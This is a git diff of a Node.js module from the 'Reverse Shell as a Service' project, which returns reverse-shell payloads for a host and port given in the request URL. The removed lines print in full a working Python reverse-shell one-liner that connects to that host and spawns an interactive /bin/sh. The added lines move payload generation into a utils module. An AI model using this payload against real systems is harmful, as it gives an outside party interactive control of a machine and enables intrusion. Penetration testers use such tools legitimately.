@@ -1,5 +1,7 @@
 'use strict';
 
+const utils = require('./utils');
+
 const usage = `# Reverse Shell as a Service
 # https://github.com/lukechilds/reverse-shell
 #
@@ -11,11 +13,9 @@ const usage = `# Reverse Shell as a Service
 #
 # 3. Don't be a dick`;
 
-const generatePayload = (host, port) => `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`;
-
 const reverseShell = req => {
 	const [host, port] = req.url.substr(1).split(':');
-	return (host && port) ? generatePayload(host, port) : usage;
+	return (host && port) ? utils.generateScript(host, port) : usage;
 };
 
 module.exports = reverseShell;
